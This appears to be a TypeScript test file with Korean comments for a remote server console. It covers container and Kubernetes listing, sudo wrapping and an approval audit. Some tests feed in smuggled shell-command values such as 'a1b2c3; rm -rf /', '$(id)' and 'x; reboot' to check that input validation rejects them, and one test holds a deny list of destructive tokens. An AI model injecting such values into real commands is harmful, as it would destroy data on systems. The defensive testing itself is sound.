    // sudo 도 실패하면 원래 이유를 지킨다 — "a password is required" 는 원인이 아니라 우리 시도다.
    expect(cmd).toContain('*sudo:*')
    // 쓰기까지 권한을 올리지는 않는다 — 정지·제거는 사람이 권한을 갖춘 계정으로 해야 한다.
    expect(buildCommand('ctr.action', { id: 'a'.repeat(12), action: 'stop' })!.cmd).not.toContain('sudo')
    expect(buildCommand('ctr.rmi', { image: 'nginx' })!.cmd).not.toContain('sudo')
  })

  it('표시가 붙어도 docker 목록은 그대로 읽고, 표시가 없으면 예전처럼 docker 로 본다', () => {
    const rows = 'a1b2c3\tweb\tnginx:1.24\trunning\tUp 3 days\t0.0.0.0:80->80/tcp'
    expect(parseCtrList(`${CTR_MARK}docker\n${rows}`).rows).toHaveLength(1)
    expect(parseCtrList(rows).runtime).toBe('docker')
    expect(parseCtrList(rows).rows).toHaveLength(1)
  })

  it('★ 목록이 나왔으면 오류 문구를 담은 이름이 있어도 화면을 안내로 덮지 않는다', () => {
    const rows = `${CTR_MARK}docker\naa11bb\tpermission denied\tbusybox\trunning\tUp 1 minute\t`
    expect(parseCtrList(rows).unavailable).toBe(false)
  })

  // #192(2026-09-21) — **탭을 가르는 기준이 바뀌었다.** 런타임 이름이 아니라 보는 층이다:
  // crictl 은 노드의 containerd 라 docker·podman 과 한 탭이고, 클러스터가 아는 파드는 kubectl 이다.
  it('★ 컨테이너 탭은 노드 런타임 셋, 쿠버 탭은 kubectl 하나(층이 다른 둘을 한 표에 섞지 않는다)', () => {
    const ctr = buildCommand('ctr.list', null)!.cmd
    expect(ctr).toContain('command -v docker')
    expect(ctr).toContain('command -v podman')
    expect(ctr).toContain('command -v crictl')
    expect(ctr).toContain('crictl ps -a -o json')
    const k8s = buildCommand('k8s.list', null)!.cmd
    expect(k8s).toContain('command -v kubectl')
    expect(k8s).toContain('kubectl get pods')
    expect(k8s).toContain(`${CTR_MARK}none`)
    expect(k8s).not.toContain('crictl')
    expect(k8s).not.toContain('docker')
    // 조작·접속은 도커 쪽 사슬만 탄다 — 쿠버 탭에는 조작 자체가 없다.
    expect(buildCommand('ctr.action', { id: 'a'.repeat(12), action: 'stop' })!.cmd).not.toContain('crictl')
    expect(buildCtrExec('a'.repeat(12))!).not.toContain('crictl')
  })

  // crictl 이 맨 뒤인 것이 설계다: 쿠버 노드(docker 없음)는 crictl 이, 개발 PC(crictl 없음)는
  // docker 가 잡힌다. 🔴 둘 다 있으면 crictl 이 감춰진다 — 그 한계는 주석·tasks.md 에 적혀 있다.
  it('★ crictl 은 docker·podman 뒤에 온다 — 그 순서가 두 흔한 노드를 동시에 맞춘다', () => {
    const ctr = buildCommand('ctr.list', null)!.cmd
    expect(ctr.indexOf('command -v docker')).toBeLessThan(ctr.indexOf('command -v crictl'))
    expect(ctr.indexOf('command -v podman')).toBeLessThan(ctr.indexOf('command -v crictl'))
  })
})

describe('컨테이너 조작 — 인자 검증(F28 R2)', () => {
  it('컨테이너 id 는 16진수만 받는다 — 이름·메타문자는 거절', () => {
    expect(validCtrId('a1b2c3d4e5f6')).toBe('a1b2c3d4e5f6')
    expect(validCtrId('a'.repeat(64))).toHaveLength(64)
    expect(validCtrId('web')).toBeNull() // 이름은 안 받는다(id 만 온다)
    expect(validCtrId('a1b2c3; rm -rf /')).toBeNull()
    expect(validCtrId('A1B2C3D4E5F6')).toBeNull() // 대문자는 docker 가 주지 않는다
    expect(validCtrId('a1b2')).toBeNull() // 너무 짧다
    expect(validCtrId(12)).toBeNull()
  })

  it('★ 할 수 있는 일은 여섯 가지뿐 — rm -f 도 exec 도 여기 없다', () => {
    for (const a of ['start', 'stop', 'restart', 'pause', 'unpause', 'rm']) expect(validCtrAction(a)).toBe(a)
    expect(validCtrAction('exec')).toBeNull()
    expect(validCtrAction('rm -f')).toBeNull()
    expect(validCtrAction('kill')).toBeNull()
  })

  it('이미지 참조는 셸 메타문자를 하나도 허용하지 않는다', () => {
    expect(validImageRef('nginx:1.24-alpine')).toBe('nginx:1.24-alpine')
    expect(validImageRef('reg.local:5000/team/app@sha256:abc')).toBe('reg.local:5000/team/app@sha256:abc')
    expect(validImageRef('nginx; rm -rf /')).toBeNull()
    expect(validImageRef('$(id)')).toBeNull()
    expect(validImageRef('a`b`')).toBeNull()
    expect(validImageRef('')).toBeNull()
  })

  it('★ 검증에 걸리면 명령 자체가 조립되지 않는다(null)', () => {
    expect(buildCommand('ctr.action', { id: 'web', action: 'stop' })).toBeNull()
    expect(buildCommand('ctr.action', { id: 'a1b2c3d4e5f6', action: 'exec' })).toBeNull()
    expect(buildCommand('ctr.action', null)).toBeNull()
    expect(buildCommand('ctr.rmi', { image: 'x; reboot' })).toBeNull()
  })

  it('통과하면 목록과 같은 런타임을 타고, 쓰기로 표시된다', () => {
    const r = buildCommand('ctr.action', { id: 'a1b2c3d4e5f6', action: 'stop' })!
    expect(r.write).toBe(true)
    expect(r.cmd).toContain('docker stop a1b2c3d4e5f6')
    expect(r.cmd).toContain('podman stop a1b2c3d4e5f6')
    expect(buildCommand('ctr.rmi', { image: 'nginx:1.24' })!.cmd).toContain('docker rmi nginx:1.24')
  })

  it('★ 컨테이너 접속은 터미널용 문자열이고, id 가 나쁘면 만들어지지 않는다', () => {
    // 이 한 줄만 exec 채널이 아니라 session.input 으로 나간다(대화형이라 그렇다).
    const cmd = buildCtrExec('a1b2c3d4e5f6')!
    expect(cmd).toContain('exec -it a1b2c3d4e5f6')
    expect(cmd).toContain('command -v docker || command -v podman')
    expect(cmd).toContain('exec bash || exec sh') // bash 가 없는 이미지 대비
    expect(buildCtrExec('web')).toBeNull()
    expect(buildCtrExec('a1b2c3d4e5f6; reboot')).toBeNull()
  })
})

// 2026-08-24 준영님 화면 실물 — 이유는 떴는데 **정작 원인이 잘렸다**. crictl 의 오류는
// `time=… level=fatal msg="… rpc error: … connect: permission denied"` 처럼 맨 끝이 답이다.
describe('컨테이너 실패 이유 — 끝까지 보여 주고, 다음 수를 알려 준다', () => {
  const FATA =
    'time="2026-08-24T10:50:03+09:00" level=fatal msg="validate service connection: validate CRI v1 runtime API for endpoint \\"unix:///run/containerd/containerd.sock\\": rpc error: code = Unavailable desc = connection error: desc = \\"transport: Error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied\\""'

  it('★ 300자에서 자르지 않는다 — permission denied 가 살아 있어야 한다', () => {
    const reason = parseCtrList(`${CTR_MARK}crictl\n${FATA}`).reason!
    expect(reason).toContain('permission denied')
    expect(reason.endsWith('…')).toBe(false)
  })

  it('★ 권한 벽이면 다음 수(root 필요)를 함께 안내한다', () => {
    expect(ctrNeedsRoot(FATA)).toBe(true)
    expect(ctrNeedsRoot('Error: no such container')).toBe(false)
    expect(ctrNeedsRoot(null)).toBe(false)
  })
})

// 2026-08-24 준영님: "쿠버는 주 목적이 모니터링이라 목록을 좀 자세하게". crictl 이 주는데 우리가
// 버리던 것들 — 재시작 횟수·나이·파드 준비 상태·CPU·메모리를 읽는다.
describe('쿠버 노드 모니터링 자료', () => {
  const PS = JSON.stringify({
    containers: [
      {
        id: 'a'.repeat(64),
        metadata: { name: 'api', attempt: 3 },
        image: { image: 'reg.local:5000/team/api:1.2.3' },
        state: 'CONTAINER_RUNNING',
        createdAt: '1724000000000000000',
        labels: { 'io.kubernetes.pod.name': 'api-7d9', 'io.kubernetes.pod.namespace': 'prod' },
        annotations: { 'io.kubernetes.container.restartCount': '3' }
      },
      {
        id: 'b'.repeat(64),
        metadata: { name: 'istio-proxy', attempt: 0 },
        image: { image: 'docker.io/istio/proxyv2:1.20' },
        state: 'CONTAINER_RUNNING',
        labels: { 'io.kubernetes.pod.name': 'api-7d9', 'io.kubernetes.pod.namespace': 'prod' }
      }
    ]
  })
  const PODS = JSON.stringify({
    items: [
      {
        id: 'p1',
        metadata: { name: 'api-7d9', namespace: 'prod', uid: 'x' },
        state: 'SANDBOX_READY',
        createdAt: '1723900000000000000'
      }
    ]
  })
  const STATS = JSON.stringify({
    stats: [
      {
        attributes: { id: 'a'.repeat(64) },
        cpu: { usageCoreNanoSeconds: { value: '5000000000' } },
        memory: { workingSetBytes: { value: '536870912' } }
      }
    ]
  })

  it('★ 재시작 횟수를 읽는다 — 쿠버에서 "뭐가 아픈가"의 첫 번째 숫자다', () => {
    const rows = parseCtrList(`${CTR_MARK}crictl\n${PS}`).rows
    expect(rows[0].restarts).toBe(3)
    expect(rows[1].restarts).toBe(0)
  })

  it('만들어진 시각을 나노초에서 ms 로 내린다 · 없으면 칸이 없다', () => {
    const rows = parseCtrList(`${CTR_MARK}crictl\n${PS}`).rows
    expect(rows[0].createdAt).toBe(1_724_000_000_000)
    expect(rows[1].createdAt).toBeUndefined()
  })

  it('★ 자원(CPU 누적·메모리)이 컨테이너 행에 얹힌다 — 화면이 표 두 개를 맞춰 보지 않게', () => {
    const list = parseCtrList(`${CTR_MARK}crictl\n${PS}\n${CTR_MARK}stats\n${STATS}`)
    expect(list.rows[0].memBytes).toBe(536_870_912)
    expect(list.rows[0].cpuNs).toBe(5_000_000_000)
    expect(list.rows[1].memBytes).toBeUndefined() // 자료가 없는 것과 0 은 다르다
  })

  it('파드 목록에서 준비 상태와 나이를 받는다', () => {
    const list = parseCtrList(`${CTR_MARK}crictl\n${PS}\n${CTR_MARK}pods\n${PODS}`)
    expect(list.pods).toEqual([
      { key: 'prod/api-7d9', ns: 'prod', name: 'api-7d9', state: 'ready', createdAt: 1_723_900_000_000 }
    ])
  })

  it('★ pods·stats 토막은 "행 0개짜리 실패한 런타임"으로 오해받지 않는다', () => {
    const list = parseCtrList(`${CTR_MARK}crictl\n${PS}\n${CTR_MARK}pods\n${PODS}\n${CTR_MARK}stats\n${STATS}`)
    expect(list.runtime).toBe('crictl')
    expect(list.unavailable).toBe(false)
    expect(list.rows).toHaveLength(2)
  })

  it('자원·파드를 못 받아도(권한·구버전) 목록은 산다', () => {
    const list = parseCtrList(`${CTR_MARK}crictl\n${PS}\n${CTR_MARK}pods\n\n${CTR_MARK}stats\nFATA[0000] nope`)
    expect(list.rows).toHaveLength(2)
    expect(list.pods).toEqual([])
    expect(list.unavailable).toBe(false)
  })

  it('★ CPU 는 두 표본을 빼서 낸다 — 첫 표본·되감김·시간 0 은 null(0% 라고 하지 않는다)', () => {
    // 5초 동안 1초어치 CPU 를 썼다 = 코어의 20%.
    expect(cpuPercent(4_000_000_000, 5_000_000_000, 5000)).toBeCloseTo(20, 5)
    expect(cpuPercent(undefined, 5_000_000_000, 5000)).toBeNull()
    expect(cpuPercent(9_000_000_000, 1_000_000_000, 5000)).toBeNull() // 컨테이너가 재시작해 되감김
    expect(cpuPercent(1, 2, 0)).toBeNull()
  })

  it('목록·파드·자원을 한 왕복으로 가져온다(목록이 열렸을 때만)', () => {
    // #192: crictl 세 구간은 컨테이너 탭(ctr.list)으로 통째로 옮겨 왔다.
    const cmd = buildCommand('ctr.list', null)!.cmd
    expect(cmd).toContain('$C pods -o json')
    expect(cmd).toContain('$C stats -o json')
    // 성공한 손(맨손이냐 sudo 냐)을 이어서 쓴다 — 목록만 sudo 로 열리고 나머지가 막히면 안 된다.
    expect(cmd).toContain("C='sudo -n crictl'")
  })
})

describe('컨테이너 권한 올리기 — 명령 조립', () => {
  it('★ 렌더러가 줄 수 있는 것은 불리언 하나다 — 문자열은 명령에 닿지 않는다', () => {
    const a = buildCommand('ctr.list', { sudo: true })!.cmd
    const b = buildCommand('ctr.list', { sudo: 'yes; rm -rf /' })!.cmd
    const plain = buildCommand('ctr.list', null)!.cmd
    expect(a).toContain("sudo -S -p '' sh -c '")
    expect(b).toBe(plain) // true 가 아니면 그냥 평범한 명령이다
    expect(b).not.toContain('rm -rf')
  })

  it('★ 스크립트 전체를 한 번의 sudo 로 감싼다 — 비밀번호를 stdin 에 한 줄만 넣으면 되도록', () => {
    for (const id of ['ctr.list', 'k8s.list'] as const) {
      const cmd = buildCommand(id, { sudo: true })!.cmd
      expect(cmd.startsWith("sudo -S -p '' sh -c '")).toBe(true)
      // 안쪽에는 sudo 가 없다(명령마다 부르면 비밀번호도 그만큼 필요하다).
      expect(cmd.slice("sudo -S -p '' sh -c '".length)).not.toContain('sudo ')
    }
    expect(buildCommand('ctr.list', { sudo: true })!.cmd).toContain('crictl ps -a -o json')
    expect(buildCommand('k8s.list', { sudo: true })!.cmd).toContain('kubectl get pods')
  })

  it('작은따옴표 탈출이 정확하다 — 셸이 스크립트를 통째로 한 인자로 받는다', () => {
    expect(sqEscape("a'b")).toBe("a'\\''b")
    expect(sqEscape('no quotes')).toBe('no quotes')
  })

  it('★ sudo 가 거절한 것을 알아본다 — 못 알아보면 5초마다 다시 보내 계정이 잠긴다', () => {
    expect(ctrSudoFailed('Sorry, try again.')).toBe(true)
    expect(ctrSudoFailed('sudo: a password is required')).toBe(true)
    expect(ctrSudoFailed('secadmin is not in the sudoers file.')).toBe(true)
    expect(ctrSudoFailed('sudo: no tty present and no askpass program specified')).toBe(true)
    // 컨테이너 목록이 정상으로 온 것을 실패로 읽으면 안 된다.
    expect(ctrSudoFailed('{"containers":[]}')).toBe(false)
    expect(ctrSudoFailed('level=fatal msg="connect: permission denied"')).toBe(false)
  })
})

// 2026-08-28 배포 전 감사(AUDIT-R1). 여기서 지키는 것 셋:
//  · 비밀번호가 나가는 기준은 **우리가 만든 명령**이지 렌더러가 보낸 불리언이 아니다
//  · 권한을 올려 달라고 한 호출은 **표의 write 와 무관하게** 사람의 승인을 받는다
//  · 2.5초마다 도는 목록은 한 바퀴에 들고 올 양의 상한이 있다
describe('권한 올리기 — 누가 판단하는가(AUDIT-R1)', () => {
  /**
   * 모든 명령을 **실제로 조립되는 인자**로 부른다. 하나라도 null 이면 그 자체가 실패다 —
   * 표에 명령이 늘었는데 이 표를 안 늘리면 새 명령이 조용히 검사 밖으로 빠진다.
   */
  const ARGS: Record<CmdId, unknown> = {
    'ps.list': null,
    'ps.kill': { pid: 4242, signal: 'TERM' },
    'svc.list': null,
    'svc.action': { unit: 'nginx.service', action: 'restart' },
    'disk.usage': null,
    'disk.du': { path: '/var' },
    'which.cli': { bin: 'claude' },
    'sys.overview': null,
    'pkg.probe': null,
    'git.worktree.add': { path: '/srv/app', name: 'fix1' },
    'git.worktree.remove': { path: '/srv/app', dest: '/srv/app-fix1' },
    'ctr.list': null,
    'k8s.list': null,
    // #192: 쿠버 읽기 셋. sudo 를 안 쓰는 명령이라 아래 WRAPPED 에는 없다.
    'k8s.ns': null,
    'k8s.describe': { ns: 'vgt-erp', pod: 'api-7d9f-x2k' },
    'k8s.yaml': { ns: 'vgt-erp', pod: 'api-7d9f-x2k' },
    'ctr.action': { id: 'a'.repeat(12), action: 'stop' },
    'ctr.rmi': { image: 'nginx:1.24' },
    'ctr.ports': { id: 'a'.repeat(12) },
    'ctr.run': { image: 'redis:8-alpine', name: 'cache', ports: ['8512:6379'] },
    'app.trace': { port: 8000 },
    'app.pipe': { pane: 'dev:0.1', port: 8000 }
  }

  /** wrapSudo 를 실제로 쓰는 명령. 이 셋 말고는 sudo 를 붙이지 않는다. */
  const WRAPPED: CmdId[] = ['ctr.list', 'k8s.list', 'app.trace']

  it('★ buildCommand 의 sudo 플래그는 wrapSudo 적용 여부와 정확히 일치한다', () => {
    const flagged: string[] = []
    for (const id of Object.keys(COMMANDS) as CmdId[]) {
      const args = { ...(ARGS[id] as object | null), sudo: true }
      const r = buildCommand(id, args)
      expect(r, `${id} 의 인자 표가 낡았다(조립 실패)`).not.toBeNull()
      // 문자열이 아니라 플래그를 믿게 되는 자리라, 둘이 어긋나면 비밀번호가 엉뚱한 명령으로 간다.
      expect(r!.sudo, id).toBe(r!.cmd.startsWith("sudo -S -p '' sh -c '"))
      if (r!.sudo) flagged.push(id)
    }
    expect(flagged.sort()).toEqual([...WRAPPED].sort())
  })

  it('★ {sudo:true} 를 실어도 sudo 를 안 쓰는 명령은 플래그가 안 선다 — 그 stdin 으로 비밀번호가 가면 안 된다', () => {
    // 감사 전에는 RemoteConsoleService 가 args.sudo 를 보고 판단해서, sudo 를 안 붙인
    // pkg.probe 의 stdin 으로 SSH 비밀번호가 나갔다(그 스크립트가 stdin 을 안 읽어 샜을 뿐).
    for (const id of ['pkg.probe', 'ps.list', 'svc.list'] as CmdId[]) {
      const r = buildCommand(id, { ...(ARGS[id] as object | null), sudo: true })!
      expect(r.sudo, id).toBe(false)
      expect(r.cmd, id).not.toContain('sudo')
    }
  })

  it('★ {sudo:true} 면 표의 write 와 무관하게 승인을 받는다 — ctr.list 는 write 가 없다', () => {
    // 이게 MCP 의 등급을 정한다. ctr.list 에 write 가 없다는 사실이 전제라 함께 못박는다.
    expect(COMMANDS['ctr.list'].write).toBeUndefined()
    expect(isPrivileged('ctr.list', { sudo: true })).toBe(true)
    expect(isPrivileged('ctr.list', null)).toBe(false)
    // 같은 구멍이 나머지 두 개에도 있었다.
    expect(isPrivileged('k8s.list', { sudo: true })).toBe(true)
    expect(isPrivileged('app.trace', { port: 8000, sudo: true })).toBe(true)
    // 쓰기 명령은 sudo 없이도 그대로 승인 대상이다(원래 규칙을 무르게 하지 않는다).
    expect(isPrivileged('ps.kill', { pid: 1, signal: 'TERM' })).toBe(true)
    expect(isPrivileged('ps.list', null)).toBe(false)
    // 불리언이 아니면 권한 올리기가 아니다 — 명령 조립과 같은 기준이다.
    expect(isPrivileged('ctr.list', { sudo: 'yes' })).toBe(false)
    // 표에 없는 id 라도 sudo 를 달고 오면 자동 허용으로 떨어지지 않는다.
    expect(isPrivileged('없는명령', { sudo: true })).toBe(true)
    expect(isPrivileged('없는명령', null)).toBe(false)
  })

  it('★ 권한을 올려도 하는 일은 같다 — sudo 판이 여전히 읽기 전용이다', () => {
    for (const id of WRAPPED) {
      const cmd = buildCommand(id, { ...(ARGS[id] as object | null), sudo: true })!.cmd
      for (const bad of ['rm ', 'kill ', 'systemctl ', 'tee ', '>>']) {
        expect(cmd, `${id} 에 ${bad} 가 끼어들었다`).not.toContain(bad)
      }
    }
  })

  it('ps.list 는 한 바퀴에 300줄까지만 — 2.5초마다 도는 명령이라 꼬리를 들고 오지 않는다', () => {
    const r = buildCommand('ps.list', null)!
    expect(r.cmd).toContain('--sort=-pcpu') // 잘리는 쪽이 CPU 를 안 쓰는 쪽이어야 의미가 있다
    expect(r.cmd).toContain('head -300')
    // 읽기 명령인 사실은 그대로다(watch 가 write 를 거절한다 — 그 길이 막히면 표가 안 뜬다).
    expect(COMMANDS['ps.list'].write).toBeUndefined()
    expect(r.write).toBe(false)
  })

  it('★ sudo 가 거절하면 "포트를 듣는 프로세스가 없다"가 아니라 "여전히 안 보인다"다', () => {
    // 관리자 권한 재시도는 hidden 에서만 뜨는 버튼이다. sudo 가 스스로 거절하면 스크립트가 아예
    // 안 돌아 listen= 줄조차 없는데, 그걸 none 으로 읽으면 화면이 "그 포트는 꺼졌다"고 거짓말한다.
    // 키 인증 프로필이 여기로 온다(패스프레이즈를 sudo 로 보내지 않으므로).
    expect(parseAppTrace('sudo: a password is required', 8000).kind).toBe('hidden')
    expect(parseAppTrace('sudo: no tty present and no askpass program specified', 8000).kind).toBe('hidden')
    // 진짜로 아무도 안 듣는 경우는 그대로 none 이다.
    expect(parseAppTrace('pid=\nlisten=0', 8000).kind).toBe('none')
  })
})
